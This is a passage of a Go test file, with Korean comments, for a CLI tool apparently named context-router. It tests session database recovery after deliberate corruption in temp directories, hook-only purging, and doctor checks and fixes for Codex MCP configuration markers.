		t.Fatalf("corrupt helper: offset out of range (size=%d off=%d)", len(raw), off)
	}
	cp := append([]byte(nil), raw...)
	for i := 0; i < 40; i++ {
		cp[off+i] = 0xEE
	}
	if err := os.WriteFile(dbPath, cp, 0o600); err != nil {
		t.Fatal(err)
	}
}

// TestRunSessionRecover_HappyPath — 태스크9b: 훼손 DB → `session recover` CLI 경로가 인양·게시를
// 완료하고 stderr에 결과를 보고한다. stdout은 비어 있어야 한다(recover는 CLI 결과 전용 규약상
// stdout 출력이 없는 것이 안전 기본, 진행 보고는 stderr 전용).
func TestRunSessionRecover_HappyPath(t *testing.T) {
	storeRoot := t.TempDir()
	projectRoot := t.TempDir()
	canon, err := ident.Canonicalize(projectRoot)
	if err != nil {
		t.Fatalf("canonicalize: %v", err)
	}
	dbDir := filepath.Join(storeRoot, "projects", canon.ProjectID, "worktrees", canon.WorktreeID)
	corruptSessionEvents(t, dbDir, 400)

	var out, errOut bytes.Buffer
	args := []string{"recover", "--project", projectRoot, "--worktree", canon.WorktreeID}
	if err := Run(context.Background(), "session", args, storeRoot, projectRoot, "0.0.1-dev", false, "", &out, &errOut); err != nil {
		t.Fatalf("Run session recover err=%v stderr=%s", err, errOut.String())
	}
	if out.Len() != 0 {
		t.Fatalf("stdout should be empty for recover, got %q", out.String())
	}
	if !strings.Contains(errOut.String(), "인양 완료") {
		t.Fatalf("stderr missing recovery report: %s", errOut.String())
	}
	if _, statErr := os.Stat(filepath.Join(dbDir, "session.recover-pending")); !errors.Is(statErr, os.ErrNotExist) {
		t.Fatalf("marker should be gone after recover, stat err=%v", statErr)
	}
}

// TestRunSessionRecover_ServerRunning_RejectsImmediately — 태스크9b: 서버(shared lease 보유)
// 실행 중이면 `session recover`가 즉시 거부돼야 한다(대기 없음).
func TestRunSessionRecover_ServerRunning_RejectsImmediately(t *testing.T) {
	storeRoot := t.TempDir()
	projectRoot := t.TempDir()
	canon, err := ident.Canonicalize(projectRoot)
	if err != nil {
		t.Fatalf("canonicalize: %v", err)
	}
	dbDir := filepath.Join(storeRoot, "projects", canon.ProjectID, "worktrees", canon.WorktreeID)
	d, err := session.Open(dbDir, session.Options{Producer: "context-router/test"})
	if err != nil {
		t.Fatalf("session.Open: %v", err)
	}
	defer func() { _ = d.Close() }()

	var out, errOut bytes.Buffer
	args := []string{"recover", "--project", projectRoot, "--worktree", canon.WorktreeID}
	err = Run(context.Background(), "session", args, storeRoot, projectRoot, "0.0.1-dev", false, "", &out, &errOut)
	if !errors.Is(err, session.ErrLeaseHeld) {
		t.Fatalf("err=%v want session.ErrLeaseHeld (out=%s stderr=%s)", err, out.String(), errOut.String())
	}
}

// TestRunSessionRecover_PublishInterrupted_DelegatesDespiteMissingDB — 최종리뷰 A1(Critical)
// 회귀: 게시(⑥) rename 도중 crash로 session.db만 사라졌지만 복구 자산(백업 main + 마커)이
// 남은 상태에서 CLI recover가 "session.db 없음"으로 거부하지 않고 session.Recover에 위임해
// 완료해야 한다(수정 전엔 session.db stat 실패로 재개 분기가 CLI로 도달 불가 → 영구 wedge).
// session 패키지의 unexported 인양본을 만들 수 없으므로, 건강 DB를 백업 family로 rename해
// restoreLatestBackup 경로로 재개가 성립하는 등가 상태를 주입한다.
func TestRunSessionRecover_PublishInterrupted_DelegatesDespiteMissingDB(t *testing.T) {
	storeRoot := t.TempDir()
	projectRoot := t.TempDir()
	canon, err := ident.Canonicalize(projectRoot)
	if err != nil {
		t.Fatalf("canonicalize: %v", err)
	}
	dbDir := filepath.Join(storeRoot, "projects", canon.ProjectID, "worktrees", canon.WorktreeID)

	// 1) 건강한 session.db를 만든다(단일 파일 — Close가 wal_checkpoint(TRUNCATE)).
	d, err := session.Open(dbDir, session.Options{Producer: "context-router/test"})
	if err != nil {
		t.Fatalf("session.Open: %v", err)
	}
	for i := 0; i < 5; i++ {
		if _, _, _, err := d.Append(session.Event{Type: "note", Summary: fmt.Sprintf("evt-%d", i)}); err != nil {
			t.Fatalf("append: %v", err)
		}
	}
	if err := d.Close(); err != nil {
		t.Fatalf("close: %v", err)
	}

	// 2) 게시 중단 상태 주입: session.db family를 백업 main으로 rename(→ session.db 부재) +
	//    복구 마커 생성. bak ts 포맷은 backupOriginal과 동일(사전순=시간순 정렬 가능).
	bakMain := "session.db.bak-20260101T000000.000000000Z"
	for _, suffix := range []string{"", "-wal", "-shm"} {
		src := filepath.Join(dbDir, "session.db"+suffix)
		if _, statErr := os.Stat(src); statErr == nil {
			if err := os.Rename(src, filepath.Join(dbDir, bakMain+suffix)); err != nil {
				t.Fatalf("rename %s: %v", suffix, err)
			}
		}
	}
	if err := os.WriteFile(filepath.Join(dbDir, "session.recover-pending"), nil, 0o600); err != nil {
		t.Fatalf("marker: %v", err)
	}
	if _, statErr := os.Stat(filepath.Join(dbDir, "session.db")); !errors.Is(statErr, os.ErrNotExist) {
		t.Fatalf("precondition: session.db should be absent, stat err=%v", statErr)
	}

	// 3) CLI recover — session.db 부재에도 위임·완료해야 한다.
	var out, errOut bytes.Buffer
	args := []string{"recover", "--project", projectRoot, "--worktree", canon.WorktreeID}
	if err := Run(context.Background(), "session", args, storeRoot, projectRoot, "0.0.1-dev", false, "", &out, &errOut); err != nil {
		t.Fatalf("Run session recover err=%v stderr=%s", err, errOut.String())
	}
	if !strings.Contains(errOut.String(), "인양 완료") {
		t.Fatalf("stderr missing recovery report: %s", errOut.String())
	}
	if _, statErr := os.Stat(filepath.Join(dbDir, "session.recover-pending")); !errors.Is(statErr, os.ErrNotExist) {
		t.Fatalf("marker should be gone after recover, stat err=%v", statErr)
	}
	// 게시된 session.db가 건강해야 한다.
	reader, err := session.OpenReadOnly(dbDir)
	if err != nil {
		t.Fatalf("OpenReadOnly: %v", err)
	}
	defer func() { _ = reader.Close() }()
	var qc string
	if err := reader.QueryRow("PRAGMA quick_check").Scan(&qc); err != nil || qc != "ok" {
		t.Fatalf("published db quick_check=%q err=%v want ok", qc, err)
	}
}

// TestRecover_UnknownWorktreeListsCandidates — 부채정리 ④: 존재하지 않는 --worktree id로
// recover 시 오류 문구가 실제 worktree 후보 id를 안내해야 한다(listWorktreeDirs 재사용). 수정
// 전에는 opaque하게 "복구 자산 확인 실패"로 끝났다.
func TestRecover_UnknownWorktreeListsCandidates(t *testing.T) {
	storeRoot := t.TempDir()
	projectRoot := t.TempDir()
	canon, err := ident.Canonicalize(projectRoot)
	if err != nil {
		t.Fatalf("canonicalize: %v", err)
	}
	// 실제 worktree 하나를 만들어 후보가 존재하게 한다.
	dbDir := filepath.Join(storeRoot, "projects", canon.ProjectID, "worktrees", canon.WorktreeID)
	d, err := session.Open(dbDir, session.Options{Producer: "context-router/test"})
	if err != nil {
		t.Fatalf("session.Open: %v", err)
	}
	_ = d.Close()

	var out, errOut bytes.Buffer
	args := []string{"recover", "--project", projectRoot, "--worktree", "nonexistent-wid"}
	err = Run(context.Background(), "session", args, storeRoot, projectRoot, "0.0.1-dev", false, "", &out, &errOut)
	if err == nil {
		t.Fatal("want error for nonexistent worktree id")
	}
	if !strings.Contains(err.Error(), canon.WorktreeID) {
		t.Fatalf("error should list candidate worktree id %q, got %q", canon.WorktreeID, err.Error())
	}
}

// seedHookOnlyProject — storeRoot 하위에 projectRoot의 canonical ID로 hook 단독(귀속) + file
// (비귀속) 아티팩트를 시드하고 (pid, projDir, ownedHash)를 반환한다. purge --hook-only CLI
// 테스트 공용 시드 — seedShadowContentDB(귀속 hash 반환)를 그대로 재사용한다.
func seedHookOnlyProject(t *testing.T) (pid, projDir, ownedHash string) {
	t.Helper()
	storeRoot := t.TempDir()
	projectRoot := t.TempDir()
	canon, err := ident.Canonicalize(projectRoot)
	if err != nil {
		t.Fatalf("canonicalize: %v", err)
	}
	pid = canon.ProjectID
	projDir = filepath.Join(storeRoot, "projects", pid)
	ownedHash = seedShadowContentDB(t, projDir)
	// storeRoot를 반환하지 않는 대신, 호출부는 projDir에서 storeRoot를 역산한다(projects/<pid>).
	return pid, projDir, ownedHash
}

// storeRootOf — projDir(=<storeRoot>/projects/<pid>)에서 storeRoot를 역산한다.
func storeRootOf(projDir string) string { return filepath.Dir(filepath.Dir(projDir)) }

// TestPurgeHookOnlyCLI — e2e: --hook-only가 전역 confirm/전체삭제(os.RemoveAll)에 도달하지 않고
// shadow 귀속 hash만 회수하며(보고 문면), content.db와 explicit(file) 소스는 보존한다. CAS
// 파일을 2h 전으로 노후화해 age-gate를 통과시켜 실제 물리 회수까지 확인한다.
func TestPurgeHookOnlyCLI(t *testing.T) {
	pid, projDir, ownedHash := seedHookOnlyProject(t)
	storeRoot := storeRootOf(projDir)
	casPath := filepath.Join(projDir, "artifacts", ownedHash[:2], ownedHash)
	old := time.Now().Add(-2 * time.Hour) // > gcOrphanMinAge(1h) → 회수(유예 아님)
	if err := os.Chtimes(casPath, old, old); err != nil {
		t.Fatalf("age CAS file: %v", err)
	}

	var out bytes.Buffer
	args := []string{"--project", pid, "--hook-only", "--force"}
	if err := runPurge(context.Background(), failReader{}, &out, io.Discard, storeRoot, args, false); err != nil {
		t.Fatalf("runPurge err=%v out=%s", err, out.String())
	}
	o := out.String()
	if !strings.Contains(o, "실회수") || !strings.Contains(o, "(1 hashes)") {
		t.Fatalf("보고 문면 없음:\n%s", o)
	}
	if !strings.Contains(o, "purge: content.db(+wal/shm) ") {
		t.Fatalf("D55 총합 보고 라인 없음:\n%s", o)
	}
	// ④ 실회수 보고가 ⑤ 총합 보고보다 먼저(스펙 §0 순서)
	if strings.Index(o, "실회수") > strings.Index(o, "purge: content.db(+wal/shm) ") {
		t.Fatalf("보고 순서 역전:\n%s", o)
	}
	// 전체 삭제 비도달: content.db 잔존.
	if _, err := os.Stat(filepath.Join(projDir, "content.db")); err != nil {
		t.Fatalf("content.db가 사라짐(전체삭제 분기에 도달) : %v", err)
	}
	// shadow 귀속 blob은 실제 회수(파일 부재).
	if _, err := os.Stat(casPath); !os.IsNotExist(err) {
		t.Fatalf("shadow CAS blob이 회수되지 않음: stat err=%v", err)
	}
	// explicit(file) 소스는 보존, hook 귀속은 0.
	sz, err := store.SizeStats(projDir)
	if err != nil || sz == nil {
		t.Fatalf("SizeStats: %v (nil=%v)", err, sz == nil)
	}
	if sz.Sources != 1 || sz.ShadowOwnedHashes != 0 {
		t.Fatalf("보존/회수 불일치: Sources=%d(want 1) ShadowOwnedHashes=%d(want 0)", sz.Sources, sz.ShadowOwnedHashes)
	}
}

// TestPurgeHookOnlyComboRejected — --hook-only는 --all/--older-than/--sessions/--gc와 조합 시
// 사용 오류(rc != 0)이고 아무것도 삭제하지 않는다(조기 분기가 store를 열기 전에 거부).
func TestPurgeHookOnlyComboRejected(t *testing.T) {
	pid, projDir, ownedHash := seedHookOnlyProject(t)
	storeRoot := storeRootOf(projDir)
	casPath := filepath.Join(projDir, "artifacts", ownedHash[:2], ownedHash)

	for _, args := range [][]string{
		{"--project", pid, "--hook-only", "--all"},
		{"--project", pid, "--hook-only", "--older-than", "1h"},
		{"--project", pid, "--hook-only", "--sessions"},
		{"--project", pid, "--hook-only", "--gc"},
	} {
		var out bytes.Buffer
		// failReader: 조합 거부는 confirm(입력 읽기) 이전에 일어나야 한다.
		if err := runPurge(context.Background(), failReader{}, &out, io.Discard, storeRoot, args, false); err == nil {
			t.Fatalf("args=%v: want usage error, got nil", args)
		}
	}
	if _, err := os.Stat(filepath.Join(projDir, "content.db")); err != nil {
		t.Fatalf("거부된 조합이 content.db를 삭제함: %v", err)
	}
	if _, err := os.Stat(casPath); err != nil {
		t.Fatalf("거부된 조합이 shadow blob을 삭제함: %v", err)
	}
}

// TestDoctorCodexMCPLine — D52 doctor [16] 5분기(v0.9 §0). CODEX_HOME 격리 하에 각 분기 출력을
// 단정한다. 버전은 runDoctor에 넘긴 ver로 스레딩하고 픽스처 marker도 같은 ver로 조립해([9]식
// marker≠version 불일치 문구 회피) 0.9.0 하드코딩 없이 범프 후에도 유효하게 유지한다.
// write — 픽스처 파일 기록 테스트 헬퍼. 원래 TestDoctorCodexMCPLine의 지역 클로저였고,
// D83의 [20]·--fix 테스트가 같은 것을 필요로 해 파일 수준으로 올렸다.
func write(t *testing.T, path string, data []byte) {
	t.Helper()
	if err := os.WriteFile(path, data, 0o600); err != nil {
		t.Fatalf("write %s: %v", filepath.Base(path), err)
	}
}

func TestDoctorCodexMCPLine(t *testing.T) {
	const ver = "9.9.9-test" // 바이너리 기본 version과 무관한 합성값 — doctor가 인자 version을 쓰는지 검증
	selfHooks, err := mergeCodexHooks(nil, buildCodexHookCommand(false, "", false), hookMarker(ver), true, true)
	if err != nil {
		t.Fatalf("selfHooks 조립: %v", err)
	}
	cases := []struct {
		name        string
		setup       func(t *testing.T, codexHome, projectRoot string)
		wantContain []string
		wantAbsent  []string
	}{
		{
			name:        "① config.toml 부재 → 미사용/미설치",
			setup:       func(t *testing.T, codexHome, projectRoot string) {},
			wantContain: []string{"[16] codex: config.toml 없음 — 미사용/미설치"},
			wantAbsent:  []string{"[16] warning:"},
		},
		{
			name: "② marker 존재 + 테이블 부재 → 소멸 시그니처 경고",
			setup: func(t *testing.T, codexHome, projectRoot string) {
				write(t, filepath.Join(codexHome, "config.toml"), []byte("[model]\nname = \"gpt\"\n"))
				write(t, filepath.Join(codexHome, "hooks.json"), selfHooks)
			},
			wantContain: []string{"[16] warning:", "hook install --codex"},
		},
		{
			name: "③ 테이블 부재·marker 부재 → 정보 라인",
			setup: func(t *testing.T, codexHome, projectRoot string) {
				write(t, filepath.Join(codexHome, "config.toml"), []byte("[model]\nname = \"gpt\"\n"))
			},
			wantContain: []string{"hook install --codex"},
			wantAbsent:  []string{"[16] warning:"},
		},
		{
			name: "④ 테이블 존재 + marker 존재(user) → 테이블=존재·project 미등록",
			setup: func(t *testing.T, codexHome, projectRoot string) {
				write(t, filepath.Join(codexHome, "config.toml"), []byte(ctrTableFixture))
				write(t, filepath.Join(codexHome, "hooks.json"), selfHooks) // user 레벨만 등록
			},
			wantContain: []string{"테이블=존재", "등록됨(", "project=미등록"},
			wantAbsent:  []string{"[16] warning:"},
		},
		{
			name: "⑤ 관리 테이블 중복 정의 → 수동 확인 경고",
			setup: func(t *testing.T, codexHome, projectRoot string) {
				write(t, filepath.Join(codexHome, "config.toml"),
					[]byte("[mcp_servers.ctr]\n[x]\n[mcp_servers.ctr]\n"))
			},
			wantContain: []string{"[16] warning:", "수동 확인"},
		},
		// 아래 셋은 D85의 **사유 인쇄** 감시선이다. ⑤는 "수동 확인"만 보므로 사유가 실리지 않는
		// 옛 문면에서도 통과한다 — 사유마다 필요한 조치가 다르다는 것이 D85의 요구다.
		{
			name: "⑥ 이상 — 중복 헤더 사유",
			setup: func(t *testing.T, codexHome, projectRoot string) {
				write(t, filepath.Join(codexHome, "config.toml"), []byte("[mcp_servers.ctr]\n[x]\n[mcp_servers.ctr]\n"))
			},
			wantContain: []string{"테이블=이상", "헤더가 둘 이상"},
		},
		{
			name: "⑦ 이상 — 정규화 불가 키 사유",
			setup: func(t *testing.T, codexHome, projectRoot string) {
				write(t, filepath.Join(codexHome, "config.toml"), []byte("[mcp_servers.ctr]\n\"comm\\u0061nd\" = \"x\"\n"))
			},
			wantContain: []string{"테이블=이상", "이스케이프 표기"},
		},
		{
			// wantAbsent가 F6의 감시선이다 — 이 파일은 헤더가 **하나뿐**이므로 "하나만 남기고
			// 지우세요"는 존재하지 않는 조치를 지시한다. 구간 밖 충돌을 중복 헤더로 접으면 물린다.
			name: "⑧ 구간 밖 충돌 — 그 상태에 맞는 사유",
			setup: func(t *testing.T, codexHome, projectRoot string) {
				write(t, filepath.Join(codexHome, "config.toml"),
					[]byte("[mcp_servers.ctr]\ncommand = \"context-router\"\n[mcp_servers.ctr.tools.ctr_execute]\napproval_mode = \"never\"\n"))
			},
			wantContain: []string{"테이블=이상", "관리 테이블 밖에"},
			wantAbsent:  []string{"헤더가 둘 이상"},
		},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			codexHome := t.TempDir()
			t.Setenv("CODEX_HOME", codexHome)
			storeRoot := t.TempDir()
			projectRoot := t.TempDir()
			c.setup(t, codexHome, projectRoot)
			var buf bytes.Buffer
			if err := runDoctor(context.Background(), &buf, storeRoot, projectRoot, ver, false); err != nil {
				t.Fatalf("runDoctor err=%v out=%s", err, buf.String())
			}
			out := buf.String()
			for _, want := range c.wantContain {
				if !strings.Contains(out, want) {
					t.Errorf("출력에 %q 없음:\n%s", want, out)
				}
			}
			for _, absent := range c.wantAbsent {
				if strings.Contains(out, absent) {
					t.Errorf("출력에 %q 있으면 안 됨:\n%s", absent, out)
				}
			}
			if !strings.Contains(out, "[17] build: ") { // D56 — [16] 직후 build 라인(ver 하류)
				t.Errorf("[17] build 라인 없음:\n%s", out)
			}
		})
	}
}

// TestDoctorMCPMarkerLine — D83 신설 검사(§2-13). 감지원이 **먼저** 물려야 --fix가 고칠
// 대상을 안다: [9]는 .claude/settings.json의 훅 그룹만 읽고, [16]의 버전 비교는 hooks.json에서
// 뽑은 값이며, config.toml은 존재·부재·이상만 읽는다. .mcp.json을 읽는 doctor 항목은 없었다.
// D82가 버전을 MCP 등록물로 옮겼으므로 이 검사가 없으면 --fix에 감지원이 하나도 남지 않는다.
func TestDoctorMCPMarkerLine(t *testing.T) {
	cases := []struct {
		name        string
		setup       func(t *testing.T, codexHome, projectRoot string)
		wantContain []string
		wantAbsent  []string
	}{
		{
			name:        "① 두 등록물 모두 부재",
			setup:       func(t *testing.T, codexHome, projectRoot string) {},
			wantContain: []string{"[20] mcp markers: .mcp.json=없음 codex=없음"},
			wantAbsent:  []string{"[20] warning:"},
		},
		{
			name: "② 두 등록물 모두 현재 버전 — 경고 없음",
			setup: func(t *testing.T, codexHome, projectRoot string) {
				var out bytes.Buffer
				if err := runHookInstall(nil, t.TempDir(), "", false, projectRoot, "0.15.0", &out); err != nil {
					t.Fatal(err)
				}
				if err := runHookInstall([]string{"--codex", "--user"}, "", "", false, projectRoot, "0.15.0", &out); err != nil {
					t.Fatal(err)
				}
			},
			wantContain: []string{"[20] mcp markers: .mcp.json=marker 0.15.0 codex=marker 0.15.0"},
			wantAbsent:  []string{"[20] warning:"},
		},
		{
			name: "③ 구 버전 표식 — 드리프트 경고",
			setup: func(t *testing.T, codexHome, projectRoot string) {
				var out bytes.Buffer
				if err := runHookInstall(nil, t.TempDir(), "", false, projectRoot, "0.14.0", &out); err != nil {
					t.Fatal(err)
				}
			},
			wantContain: []string{"marker 0.14.0", "≠0.15.0", "[20] warning:", "doctor --fix"},
		},
		{
			name: "④ 무버전 표식 — 버전 미상도 드리프트다(hostSnippet 붙여넣기 경로)",
			setup: func(t *testing.T, codexHome, projectRoot string) {
				write(t, filepath.Join(codexHome, "config.toml"),
					[]byte("[mcp_servers.ctr]\ncommand = \"context-router\"\n[mcp_servers.ctr.env]\nCTR_MANAGED = \"context-router\"\n"))
			},
			wantContain: []string{"codex=marker 버전미상", "[20] warning:"},
		},
		{
			name: "⑤ 우리 표식이 아니면 고칠 대상이 아니다",
			setup: func(t *testing.T, codexHome, projectRoot string) {
				write(t, filepath.Join(codexHome, "config.toml"),
					[]byte("[mcp_servers.ctr]\ncommand = \"other\"\n[mcp_servers.ctr.env]\nCTR_MANAGED = \"other-tool/1.0\"\n"))
			},
			wantContain: []string{"codex=미등록"},
			wantAbsent:  []string{"[20] warning:"},
		},
		{
			// 표식은 없지만 command가 우리 것인 테이블은 D80의 **인수 대상**이라 install도
			// --fix도 표식을 채운다. 그것을 "미등록"으로 보고하면 감지와 고침이 어긋난다 —
			// 검사가 고칠 것이 없다고 말한 자리에서 --fix가 파일을 바꾸게 된다.
			name: "⑥ 표식 없는 우리 테이블 — 인수 대상이므로 드리프트다",
			setup: func(t *testing.T, codexHome, projectRoot string) {
				write(t, filepath.Join(codexHome, "config.toml"),
					[]byte("[mcp_servers.ctr]\ncommand = \"context-router\"\nargs = []\n"))
			},
			wantContain: []string{"codex=표식없음", "[20] warning:", "doctor --fix"},
		},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			codexHome := t.TempDir()
			t.Setenv("CODEX_HOME", codexHome)
			projectRoot := t.TempDir()
			c.setup(t, codexHome, projectRoot)
			var buf bytes.Buffer
			if err := runDoctor(context.Background(), &buf, t.TempDir(), projectRoot, "0.15.0", false); err != nil {
				t.Fatalf("runDoctor err=%v out=%s", err, buf.String())
			}
			out := buf.String()
			for _, want := range c.wantContain {
				if !strings.Contains(out, want) {
					t.Errorf("출력에 %q 없음:\n%s", want, out)
				}
			}
			for _, absent := range c.wantAbsent {
				if strings.Contains(out, absent) {
					t.Errorf("출력에 %q 있으면 안 됨:\n%s", absent, out)
				}
			}
			// 항목 번호는 [20]이다 — 기존 번호를 밀지 않는다([16]·[17] 문면에 묶인 테스트가 있다).
			if !strings.Contains(out, "[19] permissions:") || !strings.Contains(out, "[20] mcp markers:") {
				t.Errorf("[19] 뒤에 [20]이 오지 않는다:\n%s", out)
			}
		})
	}
}

// TestDoctorFix — D83 --fix(§2-13). 드리프트를 해소하고, 드리프트 없는 픽스처에서는 무변경이며,
// 파일이 없으면 만들지 않고 안내만 낸다(doctor no-create). **파일이 있어도 우리 소유로 확인된
// 등록물이 없으면 만들지 않는다** — no-create의 범위가 파일이 아니라 등록물이라는 것이 D83이고,
// 그래야 [20]이 "미등록"으로 보고하는 상태와 --fix의 대상이 일치한다. 종료코드 계약도 바뀌지
// 않는다 — 마커 드리프트와 그 고침은 실패 항목 수 계산에 들어가지 않는다([16] 경고와 같은 취급).
func TestDoctorFix(t *testing.T) {
	codexHome := t.TempDir()
	t.Setenv("CODEX_HOME", codexHome)
	projectRoot := t.TempDir()
	var iout bytes.Buffer
	if err := runHookInstall(nil, t.TempDir(), "", false, projectRoot, "0.14.0", &iout); err != nil {
		t.Fatal(err)
	}
	if err := runHookInstall([]string{"--codex", "--user"}, "", "", false, projectRoot, "0.14.0", &iout); err != nil {
		t.Fatal(err)
	}
	mcpPath := mcpConfigPath(projectRoot)
	cfgPath := filepath.Join(codexHome, "config.toml")

	var buf bytes.Buffer
	if err := runDoctor(context.Background(), &buf, t.TempDir(), projectRoot, "0.15.0", true); err != nil {
		t.Fatalf("runDoctor --fix err=%v out=%s", err, buf.String())
	}
	mb, _ := os.ReadFile(mcpPath)
	if !strings.Contains(string(mb), `"__ctrManaged": "context-router/0.15.0"`) {
		t.Errorf(".mcp.json 표식이 고쳐지지 않았다:\n%s", mb)
	}
	cb, _ := os.ReadFile(cfgPath)
	if !strings.Contains(string(cb), `CTR_MANAGED = "context-router/0.15.0"`) {
		t.Errorf("config.toml 표식이 고쳐지지 않았다:\n%s", cb)
	}
	if _, err := os.Stat(cfgPath + ".bak"); err != nil {
		t.Errorf("--fix가 백업을 남기지 않았다: %v", err)
	}

	// 드리프트 없는 상태의 재실행은 무변경이다.
	mb2Before, _ := os.ReadFile(mcpPath)
	cb2Before, _ := os.ReadFile(cfgPath)
	var buf2 bytes.Buffer
	if err := runDoctor(context.Background(), &buf2, t.TempDir(), projectRoot, "0.15.0", true); err != nil {
		t.Fatalf("runDoctor --fix 2: %v", err)
	}
	mb2After, _ := os.ReadFile(mcpPath)
	cb2After, _ := os.ReadFile(cfgPath)
	if !bytes.Equal(mb2Before, mb2After) || !bytes.Equal(cb2Before, cb2After) {
		t.Errorf("드리프트 없는 --fix가 파일을 바꿨다")
	}

	// no-create: 파일이 없으면 만들지 않고 안내만 낸다.
	emptyHome := t.TempDir()
	t.Setenv("CODEX_HOME", emptyHome)
	emptyProj := t.TempDir()
	var buf3 bytes.Buffer
	if err := runDoctor(context.Background(), &buf3, t.TempDir(), emptyProj, "0.15.0", true); err != nil {
		t.Fatalf("runDoctor --fix(no file): %v", err)
	}
	if _, err := os.Stat(mcpConfigPath(emptyProj)); !errors.Is(err, os.ErrNotExist) {
		t.Errorf("--fix가 없던 .mcp.json을 만들었다")
	}
	if _, err := os.Stat(filepath.Join(emptyHome, "config.toml")); !errors.Is(err, os.ErrNotExist) {
		t.Errorf("--fix가 없던 config.toml을 만들었다")
	}
	if !strings.Contains(buf3.String(), "[20] fix: 대상 파일이 없어") {
		t.Errorf("no-create 안내가 없다:\n%s", buf3.String())
	}

	// no-create의 범위는 파일이 아니라 **등록물**이다(D83): 파일은 있어도 우리 소유로
	// 확인된 등록물이 없으면 만들지 않고 hook install을 안내한다. 이 상태를 [20]은
	// "미등록"으로 보고하므로 감지와 고침의 대상이 정확히 일치한다.
	otherHome := t.TempDir()
	t.Setenv("CODEX_HOME", otherHome)
	otherProj := t.TempDir()
	otherCfg := filepath.Join(otherHome, "config.toml")
	write(t, otherCfg, []byte("[model]\nname = \"gpt\"\n"))
	otherMCP := mcpConfigPath(otherProj)
	write(t, otherMCP, []byte("{\n  \"mcpServers\": {}\n}\n"))
	var buf4 bytes.Buffer
	if err := runDoctor(context.Background(), &buf4, t.TempDir(), otherProj, "0.15.0", true); err != nil {
		t.Fatalf("runDoctor --fix(미등록): %v", err)
	}
	if cb4, _ := os.ReadFile(otherCfg); strings.Contains(string(cb4), "[mcp_servers.ctr]") {
		t.Errorf("--fix가 없던 관리 테이블을 만들었다:\n%s", cb4)
	}
	if mb4, _ := os.ReadFile(otherMCP); strings.Contains(string(mb4), ctrMCPServerName) {
		t.Errorf("--fix가 없던 .mcp.json 항목을 만들었다:\n%s", mb4)
	}
	if !strings.Contains(buf4.String(), "hook install") {
		t.Errorf("미등록 안내가 없다:\n%s", buf4.String())
	}
}

// TestCodexRegistrationVerdict — D85(§2-2). 감지와 고침이 같은 판정원을 쓰는지 본다. 권고
// 술어는 --fix가 실제로 기입하는 조건 전체다: mcpWritten AND 테이블 실존 AND Changed.
// Changed 하나로 줄이면 "파일은 있고 관리 테이블만 없는" 상태에서 install이 append 경로로
// Changed=true를 내는데 --fix는 no-create로 거절하므로 오권고가 된다.
func TestCodexRegistrationVerdict(t *testing.T) {
	const ver = "0.16.0"
	ours := "[mcp_servers.ctr]\ncommand = \"context-router\"\nargs = [\"--enable\", \"ingest,net\"]\n" +
		"enabled_tools = [\"ctr_search\", \"ctr_index\", \"ctr_fetch_and_index\"]\n" +
		"[mcp_servers.ctr.env]\n" + codexMarkerKey + " = \"context-router/"
	cases := []struct {
		name      string
		cfg       string
		wantFix   bool
		wantState codexMCPState
		wantTable bool
	}{
		{
			name:      "관리 테이블 없음(파일은 있다) — 권고하지 않는다",
			cfg:       "model = \"gpt\"\n",
			wantFix:   false,
			wantState: mcpWritten,
			wantTable: false,
		},
		{
			name:      "현재 버전 — 권고하지 않는다",
			cfg:       ours + ver + "\"\n",
			wantFix:   false,
			wantState: mcpWritten,
			wantTable: true,
		},
		{
			name:      "구 버전 표식 — 권고한다",
			cfg:       ours + "0.15.0\"\n",
			wantFix:   true,
			wantState: mcpWritten,
			wantTable: true,
		},
		{
			name:      "남의 테이블 — 권고하지 않는다",
			cfg:       "[mcp_servers.ctr]\ncommand = \"other\"\n[mcp_servers.ctr.env]\n" + codexMarkerKey + " = \"other-tool/1.0\"\n",
			wantFix:   false,
			wantState: mcpExistingHeader,
			wantTable: true,
		},
		{
			// 두 케이스의 wantTable은 **true**다(실측). 구간 판정이 실패했거나 충돌이어도
			// codexManagedSpans가 헤더 자체는 찾았기 때문이다. 구속력 있는 단정은 shouldFix()가
			// 거짓이라는 것이며, 권고 술어가 State를 먼저 보므로 그 두 상태에서 TableFound가
			// 무엇이든 권고하지 않는다.
			name:      "구간 밖 충돌 — 권고하지 않는다",
			cfg:       ours + "0.15.0\"\n[mcp_servers.ctr.tools.ctr_execute]\napproval_mode = \"never\"\n",
			wantFix:   false,
			wantState: mcpConflict,
			wantTable: true,
		},
		{
			name:      "구간 판정 불가 — 권고하지 않는다",
			cfg:       "[mcp_servers.ctr]\n[x]\n[mcp_servers.ctr]\n",
			wantFix:   false,
			wantState: mcpMarkerAnomaly,
			wantTable: true,
		},
		{
			name: "사용자가 넓힌 enabled_tools + 현재 버전 — 권고하지 않는다",
			cfg: "[mcp_servers.ctr]\ncommand = \"context-router\"\nargs = [\"--enable\", \"ingest\"]\n" +
				"enabled_tools = [\"ctr_search\", \"ctr_index\", \"ctr_execute\"]\n" +
				"[mcp_servers.ctr.env]\n" + codexMarkerKey + " = \"context-router/" + ver + "\"\n",
			wantFix:   false,
			wantState: mcpWritten,
			wantTable: true,
		},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			v := codexRegistrationVerdict([]byte(c.cfg), ver)
			if v.State != c.wantState {
				t.Errorf("State=%d want %d", v.State, c.wantState)
			}
			if v.TableFound != c.wantTable {
				t.Errorf("TableFound=%v want %v", v.TableFound, c.wantTable)
			}
			if v.shouldFix() != c.wantFix {
				t.Errorf("shouldFix=%v want %v (State=%d TableFound=%v Changed=%v)",
					v.shouldFix(), c.wantFix, v.State, v.TableFound, v.Changed)
			}
		})
	}
}

// TestDoctorDetectFixEquivalence — D85(§2-1·§2-2). 감지와 고침을 한 표에서 함께 단정한다.
// 경고가 --fix를 권한 모든 상태에서 --fix가 config.toml을 바꾸고, 권하지 않은 모든 상태에서
// 바꾸지 않는다. **Codex 갈래 한정**이다 — .mcp.json 갈래는 경고 없이도 재직렬화 형식 차이·
// 은퇴 항목 정리로 파일을 다시 쓴다(스펙 §1.2 첫 항, 비범위).
func TestDoctorDetectFixEquivalence(t *testing.T) {
	const ver = "0.16.0"
	ours := "[mcp_servers.ctr]\ncommand = \"context-router\"\nargs = [\"--enable\", \"ingest,net\"]\n" +
		"enabled_tools = [\"ctr_search\", \"ctr_index\", \"ctr_fetch_and_index\"]\n" +
		"[mcp_servers.ctr.env]\n" + codexMarkerKey + " = \"context-router/"
	cases := []struct {
		name      string
